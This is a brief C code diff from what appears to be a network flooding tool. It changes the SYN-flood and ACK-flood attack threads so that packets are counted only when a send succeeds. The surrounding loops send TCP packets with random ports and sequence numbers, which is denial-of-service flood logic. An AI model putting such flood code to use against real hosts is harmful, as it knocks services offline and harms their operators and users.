@@ -229,8 +229,8 @@ void *syn_flood_attack_thread(void *param)
         src_port = leef_random_range(1025,65535);
         id = leef_random_u16();
         seq = attack_uuid << 16 | leef_random_u16();
-        leef_send_tcp_syn(&leef, src_ip, dest_addr, src_port, dest_port, id, seq);
-        packets_sent++;
+        if(leef_send_tcp_syn(&leef, src_ip, dest_addr, src_port, dest_port, id, seq))
+            packets_sent++;
         if(sleep_interval)
             usleep(sleep_interval);
     }
@@ -272,8 +272,8 @@ void *ack_flood_attack_thread(void *param)
         id = leef_random_u16();
         seq = attack_uuid << 16 | leef_random_u16();
         ack = leef_random_u32();
-        leef_send_tcp_ack(&leef, src_ip, dest_addr, src_port, dest_port, id, seq, ack);
-        packets_sent++;
+        if(leef_send_tcp_ack(&leef, src_ip, dest_addr, src_port, dest_port, id, seq, ack))
+            packets_sent++;
         if(sleep_interval)
             usleep(sleep_interval);
     }
